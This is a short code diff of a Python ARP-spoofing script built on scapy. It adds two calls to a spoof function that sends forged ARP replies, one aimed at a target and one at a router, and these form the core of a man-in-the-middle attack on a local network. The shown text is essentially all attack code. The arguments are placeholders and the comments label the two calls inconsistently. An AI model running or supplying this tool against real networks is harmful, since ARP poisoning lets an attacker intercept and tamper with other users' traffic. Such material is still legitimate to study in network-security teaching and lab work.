@@ -21,4 +21,6 @@ def spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet)
 
-get_mac("10.0.2.1")
+
+spoof("target_ip", "attacker_ip")  # first spoof target
+spoof("attacker_ip", "target_ip")  # second spoof router
